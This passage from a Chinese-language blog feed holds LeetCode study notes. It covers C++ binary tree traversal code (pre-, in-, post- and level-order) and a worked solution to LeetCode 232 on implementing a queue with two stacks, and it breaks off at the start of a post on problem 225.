class="built_in">Postorder</span>(T.root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">Levelorder</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡建構出來的樹會長這個樣子</p><p><img src="/img/LeetCode/tree/BT.png"></p><p>接著定義 Traversal Methods，主要透過遞迴的方式來實踐，因為這樣可以在 child 拜訪結束後回到它的 parent</p><h2 id="Pre-Order"><a href="#Pre-Order" class="headerlink" title="Pre-Order"></a>Pre-Order</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// V-&gt; L-&gt; R</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Preorder</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current)&#123;</span><br><span class="line">        <span class="comment">// visiting the current node</span></span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">        <span class="comment">// if leftchild exists, moving currentNode to the left child</span></span><br><span class="line">        <span class="built_in">Preorder</span>(current-&gt;leftchild);</span><br><span class="line">        <span class="built_in">Preorder</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="In-Order"><a href="#In-Order" class="headerlink" title="In-Order"></a>In-Order</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// L -&gt; V -&gt; R</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Inorder</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current)&#123;</span><br><span class="line">        <span class="built_in">Inorder</span>(current-&gt;leftchild);</span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">        <span class="built_in">Inorder</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Post-Order"><a href="#Post-Order" class="headerlink" title="Post-Order"></a>Post-Order</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// L -&gt; R -&gt; V</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Postorder</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current)&#123;</span><br><span class="line">        <span class="built_in">Postorder</span>(current-&gt;leftchild);</span><br><span class="line">        <span class="built_in">Postorder</span>(current-&gt;rightchild);</span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Level-Order"><a href="#Level-Order" class="headerlink" title="Level-Order"></a>Level-Order</h2><p>Level-Order 的特性就是在相同 Level 由左至右存取，不同Level 由上而下存取，由於先存取得先拜訪，這種特性與Queue相似，因此選擇 Queue 來實作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Using Queue</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Levelorder</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="keyword">this</span>-&gt;root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;leftchild);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;rightchild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定義一個 Queue，並且將 root 節點推進queue，而開始走訪時，將 current 定義為Queue 的front，並在 Queue 中移除該節點，接著印出當前節點值，之後先檢查left child，如果不為NULL，則 push 到 queue 中，而相同LEVEL中，檢查right child 是否為空，如果不為空一樣push 進 queue 中，接著由於 Queue 不為空，因此這時的 front 會是剛剛的left child，此時將 current 更新為 front，並且印出其值，接著檢查是否左右子樹為空，不為空就push 進 queue。下一次跌代就是處理剛剛推進 queue 的 right child，一樣印出其值，並檢查其後代是否為空，不為空就push進queue，這樣第二層 Level 的拜訪就完成了，後面就對下一層level (現在 Queue 中元素)做處理。</p><h2 id="輸出結果"><a href="#輸出結果" class="headerlink" title="輸出結果"></a>輸出結果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A B D E G H C F I   // Preorder</span><br><span class="line">D B G E H A F I C   // Inorder</span><br><span class="line">D G H E B I F C A   // Postorder</span><br><span class="line">A B C D E F G H I   // Levelorder</span><br></pre></td></tr></table></figure><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這篇介紹了甚麼是Tree，它的定義與特性， Binary Tree 和不同的 Traversal 方法和程式碼，後續會更進一步介紹的延伸的程式碼實作，並且介紹 BST(Binary Search Tree) 還有 BFS, DFS的實作方式。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://hackmd.io/@meyr543/r1lbVkb-K">https://hackmd.io/@meyr543/r1lbVkb-K</a><br>[2] <a href="https://www.geeksforgeeks.org/difference-between-bfs-and-dfs/">https://www.geeksforgeeks.org/difference-between-bfs-and-dfs/</a><br>[3] <a href="https://alrightchiu.github.io/SecondRound/binary-tree-jian-li-yi-ke-binary-tree.html">https://alrightchiu.github.io/SecondRound/binary-tree-jian-li-yi-ke-binary-tree.html</a><br>[4] <a href="https://web.ntnu.edu.tw/~algo/BinaryTree.html">https://web.ntnu.edu.tw/~algo/BinaryTree.html</a><br>[5] <a href="https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in">https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in</a><br>[6] <a href="https://it5606.medium.com/%E5%BB%BA%E7%AB%8Bbinary-tree-a02fedbc51a8">https://it5606.medium.com/%E5%BB%BA%E7%AB%8Bbinary-tree-a02fedbc51a8</a><br>[7] <a href="https://hackmd.io/@Aquamay/HyCgHXfid">https://hackmd.io/@Aquamay/HyCgHXfid</a><br>[8] <a href="https://jimmyswebnote.com/tree/">https://jimmyswebnote.com/tree/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Tree Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Stack來實現Queue | Easy | LeetCode#232. Implement Queue using Stacks</title>
      <link href="/posts/8cb54984.html"/>
      <url>/posts/8cb54984.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/232/question1.jpeg"><br><img src="/img/LeetCode/232/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 這題要求透過兩個 Stack 來實現一個Queue具有的基本操作，像是 <code>push</code>, <code>peek</code>, <code>pop</code> 以及 <code>empty</code></li></ul><p>題目也有提醒只可以使用標準 Stack 操作來實現 You must use only standard operations of a stack, which means only push to top, peek&#x2F;pop from top, size, and is empty operations are valid.</p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題跟 <a href="https://leozzmc.github.io/posts/6dfa2271.html">225. Implement Stack using Queues</a> 其實是很類似的:</p><p><img src="/img/LeetCode/232/algo.png"></p><p>Push 操作可以直接使用 <code>&lt;stack&gt;</code> 中的 <code>push()</code> STL 進行操作，重點會是實現 <code>pop()</code> 跟 <code>peak()</code>，由於Queue會是 FIFO，因此先進去Queue的會先出來，因此我們用Stack實作的時候等同於要優先將Stack的底部元素pop出來，這時候就需要第二個Stack進行暫存。</p><p>因此每當我們需要Pop時，都必須將最底部元素以外的資料全部push進第二個stack，結束操作後就可以再複製回第一個stack。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;&#125;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; sk1;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; sk2;</span><br><span class="line">    <span class="type">int</span> size_Sk1=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> size_Sk2=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        sk1.<span class="built_in">push</span>(x);</span><br><span class="line">        size_Sk1++;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">            <span class="comment">// if it is the last element</span></span><br><span class="line">            <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">                result = sk1.<span class="built_in">top</span>();</span><br><span class="line">                sk1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">                sk1.<span class="built_in">pop</span>();</span><br><span class="line">                size_Sk2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//copy sk2 to sk1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">            sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">            sk2.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        size_Sk2=<span class="number">0</span>;</span><br><span class="line">        size_Sk1--;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// queue.front(), This is equal to the bottom of the stack</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">            <span class="comment">// if it is the last element</span></span><br><span class="line">            <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">                result = sk1.<span class="built_in">top</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">                sk1.<span class="built_in">pop</span>();</span><br><span class="line">                size_Sk2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//copy sk2 to sk1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">            sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">            sk2.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        size_Sk2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue* obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;peek();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="type">int</span>&gt; sk1;</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; sk2;</span><br><span class="line"><span class="type">int</span> size_Sk1=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> size_Sk2=<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>首先初始化兩個 stack 以及stack大小</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    sk1.<span class="built_in">push</span>(x);</span><br><span class="line">    size_Sk1++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的Queue操作都由Sk1實現，這裡就正常push</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">            result = sk1.<span class="built_in">top</span>();</span><br><span class="line">            sk1.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">            sk1.<span class="built_in">pop</span>();</span><br><span class="line">            size_Sk2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">        sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">        sk2.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    size_Sk2=<span class="number">0</span>;</span><br><span class="line">    size_Sk1--;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>pop() 從Queue中移除並返回front</li><li>如果 <code>sk1</code> 為空，則返回 -1</li><li>使用 for 循環將 <code>sk1</code> 中的所有資料移動到 <code>sk2</code>，但保留最後一個資料，這個資料就是要返回的結果</li><li>然後將 <code>sk2</code> 中的所有資料移回 <code>sk1</code></li><li>最後更新 <code>size_Sk1</code> 和 <code>size_Sk2</code> 的值，並返回結果</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">            result = sk1.<span class="built_in">top</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">            sk1.<span class="built_in">pop</span>();</span><br><span class="line">            size_Sk2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">        sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">        sk2.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    size_Sk2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>peek() 返回隊列front元素，但不移除它</li><li>如果 <code>sk1</code> 為空，則返回 -1</li><li>操作類似於 pop() ，但最後不pop出最前面的資料(Stack底部資料)，而是僅保存其值並將 <code>sk2</code> 所有資料移回 <code>sk1</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>檢查Queue 是否為空，等同於檢查 <code>sk1</code> 是否為空</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/232/result.jpeg"></p><blockquote><p>我覺得是 peak 跟 pop 花費太久時間</p></blockquote><h2 id="比較簡潔的寫法"><a href="#比較簡潔的寫法" class="headerlink" title="比較簡潔的寫法"></a>比較簡潔的寫法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; s1, s2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        s1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!s1.<span class="built_in">empty</span>()) s2.<span class="built_in">push</span>(s1.<span class="built_in">top</span>()), s1.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> ans = s2.<span class="built_in">top</span>();</span><br><span class="line">        s2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">while</span>(!s2.<span class="built_in">empty</span>()) s1.<span class="built_in">push</span>(s2.<span class="built_in">top</span>()), s2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!s1.<span class="built_in">empty</span>()) s2.<span class="built_in">push</span>(s1.<span class="built_in">top</span>()), s1.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> ans = s2.<span class="built_in">top</span>();</span><br><span class="line">        <span class="keyword">while</span>(!s2.<span class="built_in">empty</span>()) s1.<span class="built_in">push</span>(s2.<span class="built_in">top</span>()), s2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s1.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>這中間的概念就是，push一樣正常push到s1，但pop的時候，只要將s1依序push到s2，這樣stack中的top就會是queue的front，直接回傳top資料就好，而這時再將s2元素丟回s1。<br>然後我那個 for 去迭代的寫法真的醜，用 <code>while(!s1.empty())</code> 比較水</p></blockquote><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><code>push</code>, <code>empty</code>: $O(1)$</li><li><code>pop</code>, <code>peak</code>: $O(N)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>四個 method 都是 $O(1)$，大多是重新排列現有元素</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
            <tag> Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Queue來實現Stack | Easy | LeetCode#225. Implement Stack using Queues</title>
      <link href="/posts/6dfa2271.html"/>
      <url>/posts/6dfa2271.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/225/question1.jpeg"><br><img src="/img/LeetCode/225/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 本題要求僅能使用兩個Queue來實現具有LIFO特性的Stack功能，需要能夠支援正常的Stack操作像是(<code>push</code>, <code>pop</code>, <code>top</code>, <code>empty</code>功能)，題目額外提醒，我們只能使用常規queue操作，像是<code>push to back</code>, <code>peek/pop from the front</code>, <code>size</code>, <code>isEmpty</code>。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>由於 <strong>我覺得Stack 跟 Queue最大的不同就是 FIFO 以及 LIFO，因此只要有辦法調整pop出來的順序即可</strong>，因此push可以正常push，但pop需要能夠回傳queue的尾端元素，top的話就直接用<code>&lt;queue&gt;</code> 的 <code>back()</code> 即可。</p><p><img src="/img/LeetCode/225/algo.png"></p><p>題目有說可以用兩個Queue，因此一個正常push進去的queue，如果要對它進行 pop，我們就需要依序將queue內資料Pop出來直到找到最後一個資料，但這些被pop出來的資料從Stack角度來看應該還要存在於Stack中，所以我們需要另一個queue將原先pop出來的元素存放起來。一旦原先的queue清空後，這時候可能使用者又會再進行push，由於我們push,pop操作都是在第一個queue進行，目前有資料的queue只是用來暫存資料用，因此需要把第二個queue的資料全部移動回第一個queue。</p><p>接著 top 以及empty用queue原本的STL即可實現。</p><h2 id="我的解法"><a href="#我的解法" 